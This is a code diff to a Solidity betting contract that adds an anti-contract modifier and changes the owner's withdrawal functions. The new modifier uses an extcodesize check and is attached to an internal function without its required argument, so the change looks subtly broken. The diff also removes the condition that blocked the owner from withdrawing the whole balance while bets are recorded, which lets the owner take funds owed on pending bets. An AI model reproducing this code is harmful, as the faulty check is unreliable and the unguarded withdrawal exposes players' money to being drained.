@@ -32,6 +32,12 @@ contract Game{
 
     modifier onlyOwner(){require(msg.sender==owner);_;}
     modifier gameOpened(){require(opening);_;}
+    modifier notContract(address addr) {
+       uint size;
+       assembly { size := extcodesize(addr) }
+       require(size == 0);
+       _;
+      }
     constructor(string _name, address pool)public{
         name = _name;
         _CoinPool = CoinPool(pool);
@@ -132,7 +138,7 @@ contract Game{
         }
     }
 
-    function openIbet(BetStruct storage ibet, uint256 betNumber, uint256 openNumber) internal returns(uint256,uint256) {
+    function openIbet(BetStruct storage ibet, uint256 betNumber, uint256 openNumber) internal returns(uint256,uint256) notContract {
             (address player, uint256 trxvalue, uint256 rtrxvalue, uint256 number, uint32 betType) = decode(ibet.betInfoEn);
             if (number >= block.number)
                 return(0, 0);
@@ -221,15 +227,11 @@ contract Game{
     }
 
     function withdraw() external onlyOwner {
-        if (BetRecord.length == 0){
-            msg.sender.transfer(address(this).balance);
-        }
+        msg.sender.transfer(address(this).balance);
     }
 
     function withdrawToken(uint256 tokenID) external onlyOwner {
-        if (BetRecord.length == 0){
-            msg.sender.transferToken(address(this).tokenBalance(tokenID), tokenID);
-        }
+        msg.sender.transferToken(address(this).tokenBalance(tokenID), tokenID);
     }
 
     function balanceTRX() external view returns(uint256){
